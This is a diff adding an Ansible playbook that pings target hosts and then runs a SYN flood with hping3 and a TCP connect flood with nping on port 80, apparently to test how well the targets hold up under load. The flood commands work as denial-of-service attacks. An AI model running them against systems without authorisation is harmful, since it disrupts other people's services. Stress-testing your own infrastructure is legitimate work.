@@ -1,0 +1,55 @@
+
+- hosts: testing_clients
+
+  gather_facts: no
+  vars:
+    ping_inconsistency: []
+  tasks:
+
+  # Ping test
+  - name: "Pinging"
+    shell: ping -q -c 5 -W 1 {{ item.target }}
+    register: ping_status
+    loop: "{{ flood.syn }}"
+    changed_when: no
+    failed_when: no
+
+
+  - name: "Check if pings where ok"
+    set_fact:
+      ping_inconsistency: "{{ ping_inconsistency + [ inventory_hostname + ': packet loss pinging ' + item.item ]}}"
+    when: '" 0% packet loss" not in item.stdout'
+    loop: "{{ ping_status.results }}"
+
+  # SYN flood
+  - name: "SYN Flood"
+    shell:  |
+      hping3 -n -S --flood -p 80 {{ item.target }} &
+      sleep 10
+      pkill hping3
+    loop: "{{ flood.syn }}"
+    changed_when: no
+    failed_when: no
+
+  # SYN flood
+  - name: "TCP Flood"
+    shell:  |
+      nping --tcp-connect -rate=50 -c=1000000 -q {{ item.target }} -p80  &
+      sleep 120
+      pkill nping
+    loop: "{{ flood.tcp }}"
+    changed_when: no
+    failed_when: no
+
+  # Ping test
+  - name: "Check if pings where ok"
+    set_fact:
+      ping_inconsistency: "{{ ping_inconsistency + [ inventory_hostname + ': packet loss pinging ' + item.item ]}}"
+    when: '" 0% packet loss" not in item.stdout'
+    loop: "{{ ping_status.results }}"
+
+  # Printing results
+
+  - name: Analyze and print result
+    debug:
+       msg: "{{ 'Pings ok. Flood executed!' if (ping_inconsistency | length) == 0 else ping_inconsistency}}"
